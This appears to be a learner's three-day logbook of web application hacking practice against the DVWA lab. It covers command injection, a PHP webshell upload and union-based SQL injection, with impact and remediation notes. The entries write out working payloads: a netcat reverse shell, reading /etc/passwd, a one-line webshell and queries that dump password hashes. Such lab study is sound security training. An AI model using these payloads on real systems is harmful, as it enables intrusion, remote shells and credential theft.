# Web-App-Hacking
A 3 week series of my journey in Web Application Hacking.


# The Foundry Logbook - Day 1

**Date:** 2026-04-15
**Focus:** Environment Setup & Command Injection Fundamentals

## 1. Environment Setup
- Installed Apache2, MySQL, PHP manually on Kali.
- Cloned DVWA from GitHub and configured `config.inc.php`.
- Set PHP `allow_url_include = On`.

## 2. First Exploit (Command Injection)
**Vulnerability:** The `ping` utility passes user input directly to the system shell without sanitization.

**Payloads Used:**
`127.0.0.1; ls -la`
`127.0.0.1; whoami`
`127.0.0.1; cat /etc/passwd`
`127.0.0.1; nc -e /bin/bash 10.0.2.4 4444`

**Result:** 
1. Directory listing of `/var/www/html/DVWA/vulnerabilities/exec/` was displayed, confirming arbitrary command execution.
2. Identity of the web server `www-data`.
3. A list of all users on the Linux box.
4. A reverse shell connection. Connects to my Kali box and gives me command line prompt on the server.

**Screenshot:**
![Command Injection Output screenshots]

## 3. Lessons Learned
- A semicolon (`;`) in a text box is a dangerous thing.
- The web server runs as `www-data` and can read system files like `/etc/passwd`.
- Manual installation teaches you about dependencies and file permissions.
- You can connect to another instance.




# Foundry Logbook - Day 2

**Date:** 2026-04-17
**Focus:** HTTP Interception, Burp Suite Configuration, Unrestricted File Upload to RCE.

## 1. Burp Suite Configuration
- Configured Firefox to proxy traffic through `127.0.0.1:8080`.
- Installed Burp CA Certificate to intercept HTTPS traffic without warnings.
- Successfully intercepted and modified the `User-Agent` header to impersonate `Googlebot`.

## 2. File Upload Vulnerability to Remote Code Execution

**Target:** DVWA (Low Security)

**Vulnerability:** The application does not validate the file extension or content type of uploaded files. It also stores the file in a publicly accessible directory and allows execution of PHP code.

**Exploitation Steps:**
1. Created a minimal PHP webshell (`<?php system($_REQUEST['cmd']); ?>`).
2. Uploaded `shell.php` via the vulnerable form.
3. Navigated to the uploaded file with a command parameter.

**Payload URL:**
`http://localhost/DVWA/hackable/uploads/shell.php?cmd=ls%20-la%20/var/www/html/DVWA/hackable/uploads/`

**Result:**
The server returned `shell.php`, confirming command execution in the context of the web server user.

**Impact:**
Complete compromise of the web server's operating system. Attacker can read files, pivot to internal networks, or establish persistence.

**Remediation:**
1. Use a whitelist of allowed file extensions (e.g., `.jpg`, `.png` only).
2. Rename uploaded files to a random string (e.g., `md5(time())`).
3. Store uploaded files outside the web root.
4. Configure the web server to not execute scripts in the upload directory.

**Screenshot 2: Webshell executing `Remote Code Execution`**
![Webshell RCE]

## 3. Lessons Learned
- HTTP is a plaintext protocol. Intercepting it reveals all secrets.
- File upload features are a prime target for RCE.
- A single quote `'` in the wrong place is a weapon; a missing extension check is a backdoor.

# Foundry Logbook - Day 3

**Date:** 2026-04-23
**Focus:** SQL Injection (Error-Based & Union-Based), Data Extraction from DVWA Low Security.

## 1. Vulnerability Identification
- Input `1'` caused a SQL syntax error, confirming unsanitized input.
- The parameter is enclosed in single quotes: `WHERE user_id = '$id'`.

## 2. Exploitation Steps
### Step 1: Determine column count
- `1' ORDER BY 1-- -` → OK
- `1' ORDER BY 2-- -` → OK
- `1' ORDER BY 3-- -` → Error → **2 columns**

### Step 2: Union injection to find displayed columns
- `1' UNION SELECT 1,2-- -` → both 1 and 2 appear on screen.

### Step 3: Extract database name and user
- Payload: `1' UNION SELECT user(),database()-- -`
- Result: `root@localhost` and `dvwa` (the database name)

### Step 4: Enumerate tables
- `1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema='dvwa'-- -`
- Found tables: `guestbook`, `users`

### Step 5: Dump user credentials
- `1' UNION SELECT user,password FROM dvwa.users-- -`
- Extracted all usernames and MD5 password hashes (e.g., admin:5f4dcc3b5aa765d61d8327deb882cf99 = "password")

## 3. Impact
Complete compromise of the database. Attacker can read, modify, or delete data, and potentially read server files (LOAD_FILE) or write files (INTO OUTFILE) to gain RCE.

## 4. Remediation
- Use parameterized queries (prepared statements) with PDO or MySQLi.
- Never concatenate user input into SQL strings.
- Implement least privilege database user.
- Filter error messages from production.

## 5. Key Takeaway
A single quote `'` is the master key. With `UNION SELECT` and `information_schema`, the entire database structure is an open book.

**Screenshots:**
- [Error triggered by single quote]
- [Union select returning database()]
- [Dumped user credentials]
